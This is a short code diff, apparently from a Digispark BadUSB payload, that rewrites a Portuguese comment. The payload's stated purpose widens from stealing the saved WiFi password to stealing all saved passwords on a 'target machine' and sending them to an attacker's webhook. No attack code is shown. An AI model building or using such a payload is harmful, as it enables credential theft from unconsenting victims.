@@ -1,5 +1,5 @@
 /*
-O payload a seguir irá capturar a senha Wifi salva do computador e enviará para o seu webhook hospedado.
+O payload a seguir irá capturar as senhas salvas na máquina alvo e enviará para o seu webhook hospedado.
 */
 
 #include "DigiKeyboard.h"
